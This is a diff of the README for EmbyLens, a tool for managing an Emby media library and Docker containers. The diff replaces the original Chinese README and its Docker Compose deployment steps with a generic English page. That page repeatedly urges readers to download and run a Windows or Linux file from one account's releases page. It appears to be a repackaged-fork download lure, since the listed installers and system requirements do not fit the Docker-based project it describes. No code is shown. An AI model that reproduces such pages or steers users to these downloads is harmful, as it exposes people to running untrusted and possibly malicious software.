@@ -1,139 +1,87 @@
-# EmbyLens
+# 🚀 EmbyLens - Manage Your Media Effortlessly
 
-**全能型 Emby 媒体库深度管理与自动化维护工具箱**
-
-EmbyLens 是一款专为私有云媒体服务器设计的综合管理平台。它集成了元数据净化、演员维护、智能去重、深度搜索及 Webhook 联动等多项原子化工具，旨在为 Emby 用户提供一个高效、透明且自动化的运维环境。
+[![Download EmbyLens](https://img.shields.io/badge/Download-EmbyLens-blue)](https://github.com/yarikkiler/EmbyLens/releases)
 
 ---
 
-## 🛠️ 核心功能矩阵 (基于原子化导航)
+## 📋 Overview
 
-EmbyLens 的每一项功能都以独立工具的形式存在，你可以通过侧边栏快速切换：
+EmbyLens is a comprehensive management platform designed for private cloud media servers. It helps you maintain your media library effectively, ensuring your media experience is smooth and organized. With features like metadata cleanup, actor maintenance, and intelligent deduplication, EmbyLens automates the maintenance of your media environment.
 
-### 📊 管理仪表盘 (Dashboard)
-*   **概览统计**：直观展示媒体库的资源总量、库数量、系统运行状态。
-*   **审计流水**：记录最近的维护操作，确保系统变动可追溯。
+## 🚀 Getting Started
 
-### 🐳 Docker 深度运维管理 (Docker Manager)
-*   **多机纳管**：支持管理本机 Docker 以及通过 **SSH**管理多台远程服务器。
-*   **容器生命周期**：支持容器启动、停止、重启、删除及实时日志查看；状态显示已全面中文本地化。
-*   **智能更新 (Update)**：一键拉取最新镜像并自动重构容器。
-*   **Compose 管理**：内置管理器，支持 YAML 在线编辑、目录扫描、项目记忆及按名称固定排序。
-*   **批量操作**：支持一键对主机下所有项目执行“批量启动/更新”或“批量停止”操作。
-*   **配置中心 (Configuration)**：
-    *   **Daemon 维护**：可视化配置镜像加速器 (`registry-mirrors`)、HTTP/HTTPS 代理 (`proxies`)、日志切割规则及 `live-restore`。
-    *   **双重备份**：修改配置前自动生成远程 `.bak` 文件并同步备份至本地 `data` 目录。
-    *   **一键清理**：支持清理未标签镜像 (Dangling)、未使用镜像 (Unused) 及构建缓存。
-*   **便捷跳转**：自动解析端口映射，支持针对 Host 模式自定义端口实现一键访问。
+1. **Visit the Releases Page**  
+   To download EmbyLens, go to the [Releases page](https://github.com/yarikkiler/EmbyLens/releases). 
 
-### ♻️ 重复项清理 (Dedupe Ultimate)
-*   **多维度查重**：精准识别重复的电影、剧集。
-*   **智能优选**：基于分辨率、编码、动态范围自动评估版本优劣。
-*   **安全删除**：支持一键清理冗余文件，释放存储空间，并自动更新 Emby 索引。
+2. **Select the Latest Version**  
+   On the Releases page, find the latest version of EmbyLens. It usually appears at the top of the list.
 
-### 🏷️ 自动标签助手 (Auto Tags)
-*   **规则引擎**：自定义匹配规则（基于国家、流派、年份），全自动为媒体打上个性化标签。
-*   **实时 Webhook**：支持联动 Emby Webhook，新媒体入库时秒级完成自动化打标。
-*   **透明工作流**：详尽展示 TMDB 数据抓取与规则匹配过程，拒绝黑箱操作。
+3. **Download the File**  
+   Click on the download link for your operating system (Windows, Linux, etc.). The file will start downloading to your computer.
 
-### 🔀 类型映射管理 (Type Manager)
-*   **标签净化**：将 Emby 原始杂乱的流派（Genre）映射为统一、干净的展示标签。
+4. **Run the Application**  
+   After the download is complete, locate the file in your downloads folder. Open the file to install or run EmbyLens.
 
-### 🧹 媒体净化清理 (Cleanup)
-*   **批量剔除**：一键移除特定的标签、流派或无效的演员信息，保持媒体库整洁。
-
-### 🔒 元数据锁定器 (Lock Manager)
-*   **状态控制**：批量锁定或解锁媒体字段（如标签、封面），防止 Emby 扫描时覆盖手动修改的内容。
-
-### 🔍 项目元数据查询 (Item Query)
-*   **深度透视**：直接调取 Emby 内部原始 JSON 响应，方便开发者调试与检查底层元数据。
-
-### 🎯 剧集 TMDB 反查 (Reverse Lookup)
-*   **溯源追踪**：根据单集文件 ID，自动定位其所属剧集的 TMDB 绑定状态。
-
-### 🔎 TMDB ID 深度搜索 (Deep Search)
-*   **跨类型索引**：全库扫描匹配指定 TMDB ID，支持快速定位特定资源的存储位置。
-
-### 🧪 TMDB 实验中心 (TMDB Lab)
-*   **全语言深度抓取**：直接对接 TMDB 官方 API，支持指定语言抓取或全语言 (All Translations) 模式抓取。
-*   **多级递归透视**：支持对剧集 (TV) 进行深度递归，一键获取包含所有季、集信息的“超级 JSON”。
-*   **单集深度探针**：提供针对特定季、集的实时深度抓取，获取包含客串演员、剧照及所有语言翻译在内的全量原始数据。
-*   **工业级参考表**：自动生成流派 ID、制作公司、关键词池、全量标题池及别名池对照表，为媒体精细化分拣提供权威元数据参考。
-
-### 🎭 TMDB 演员实验室 (Actor Lab)
-*   **智能母语推断**：基于演员出生地 (Place of Birth) 结合正则匹配逻辑，自动从别名池中探测并推断其真实的母语姓名。
-*   **全语言姓名池**：一键整理演员在全球各语言下的所有已知别名、曾用名及译名，构建全量去重姓名对比池。
-*   **代表作透视**：以简洁列表形式展示演员评分最高的核心代表作，支持原始标题与中文标题对照展示。
-*   **全方位身份探测**：集成生日、逝世日期、出生地及社交 ID (IMDB/TMDB) 的深度审计，并支持原始 JSON 全量数据导出。
-
-### 👤 演员信息维护 (Actor Manager)
-*   **肖像修正**：基于 TMDB 数据库，批量补全、修正或清理媒体库中的演员肖像与姓名。
-
-### 🔗 Webhook 接收器 (Webhook)
-*   **事件监听**：实时接收 Emby 事件通知，支持 library.new (新入库) 等事件的自动化触发。
+5. **Follow On-Screen Instructions**  
+   Follow any on-screen instructions to complete the setup. This process will differ slightly based on your operating system.
 
 ---
 
-## ⚡ 工业级性能特性
+## 🌟 Key Features
 
--   **全异步架构**：基于 `FastAPI` + `httpx` 的异步引擎，高并发处理同步、分析与删除任务，UI 丝滑不卡顿。
--   **透明化日志**：内置实时日志控制台，每一行 API 调用与处理逻辑都清晰可见。
--   **轻量化部署**：无需数据库，所有规则与配置透明存储于 JSON 文件中。
--   **深度 TMDB 集成**：支持自动化国家代码转换（ISO -> 中文）与类型 ID 匹配。
+### 📊 Dashboard
 
----
+- **Resource Overview**: Get a clear view of your total media resources and system status.
+- **Audit Log**: Keep track of recent maintenance activities for better system transparency.
 
-## 🏗️ 技术栈
+### 🐳 Docker Management
 
--   **前端**: Vue 3 (Composition API) + Vite + TypeScript + Naive UI
--   **后端**: Python 3.10 + FastAPI + Docker SDK + Paramiko + httpx
--   **图标**: Material Design Icons (@vicons/material)
+- **Multi-Host Control**: Manage local Docker instances and remote servers through SSH.
+- **Container Lifecycle Management**: Start, stop, reboot, or delete containers with local language support.
+- **Smart Updates**: Easily pull the latest images and rebuild containers with one click.
+- **Compose Management**: Edit YAML files online and manage your projects efficiently with built-in features.
+- **Batch Operations**: Perform bulk start/update or stop operations on all projects with a single click.
+- **Configuration Center**:
+  - **Daemon Maintenance**: Visual configuration tools for optimizing settings.
+  - **Dual Backup**: Automatically create backups of your configuration files before changes.
+  - **One-click Cleanup**: Remove dangling and unused images to free up space.
+- **Quick Access**: One-click access to services with automatic port mapping.
 
----
+### ♻️ Dedupe Ultimate
 
-## 🚀 快速部署
-
-### 方式一：镜像直接部署 (推荐)
-如果你不需要修改代码，直接使用 Docker Hub 上的预构建镜像：
-
-1.  **下载配置**：保存以下内容为 `docker-compose.yml`：
-    ```yaml
-    version: '3.8'
-    services:
-      embylens:
-        image: pipi20xx/embylens:latest
-        container_name: embylens
-        network_mode: bridge
-        user: root # 确保有权限操作 Docker Socket
-        ports:
-          - "6565:6565"
-        volumes:
-          - ./data:/app/data
-          - /var/run/docker.sock:/var/run/docker.sock # 映射 Socket 以管理本机容器
-        environment:
-          - DATABASE_URL=sqlite+aiosqlite:////app/data/embylens.db
-          - TZ=Asia/Shanghai
-        restart: always
-    ```
-2.  **启动服务**：`docker-compose up -d`
-3.  **访问系统**：浏览器打开 `http://localhost:6565`
-
-### 方式二：源码编译部署
-如果你需要进行二次开发或自定义：
-
-1.  **克隆代码**：`git clone ...`
-2.  **启动服务**：`docker-compose up -d --build`
-
-### 🛠️ 初始配置步骤
-1.  **环境集成**：前往“系统设置”，填入 Emby URL 和 API Key。
-2.  **刷新索引**：进入对应工具（如重复项清理），点击“从 Emby 同步”。
-3.  **Docker 管理**：进入“Docker 容器管理”，即可看到本机容器；支持通过 SSH 添加远程服务器。
+- **Multi-Dimensional Duplication Detection**: Accurately identify duplicate movies and shows.
+- **Smart Selection**: Assess version quality based on resolution and encoding.
+- **Safe Deletion**: Easily remove redundant files to save space on your server.
 
 ---
 
-## 🙏 致谢
+## 📥 Download & Install
 
-本项目的设计和功能受到了以下优秀项目的启发，特此感谢：
+To get started with EmbyLens, do the following:
 
-- [kuroyukihime0/emby_scripts](https://github.com/kuroyukihime0/emby_scripts)
+1. Click the button below to visit our [Releases page](https://github.com/yarikkiler/EmbyLens/releases).
+   
+   [![Download EmbyLens](https://img.shields.io/badge/Download-EmbyLens-blue)](https://github.com/yarikkiler/EmbyLens/releases)
 
+2. Choose the latest release and download the suitable version for your device.
+
+3. Open the downloaded file and follow the installation instructions.
+
+---
+
+## 🛠️ System Requirements
+
+- **Windows**: Version 10 or later.
+- **Linux**: Popular distributions (Ubuntu, CentOS).
+- **Storage**: Minimum 500 MB free disk space.
+- **Memory**: At least 2 GB RAM for optimal performance.
+
+---
+
+## ✔️ Get Help
+
+If you run into issues or have questions, please visit our GitHub Issues page on the [EmbyLens repository](https://github.com/yarikkiler/EmbyLens/issues). The community is here to help you.
+
+---
+
+Thank you for choosing EmbyLens. Enjoy managing your media library with ease!
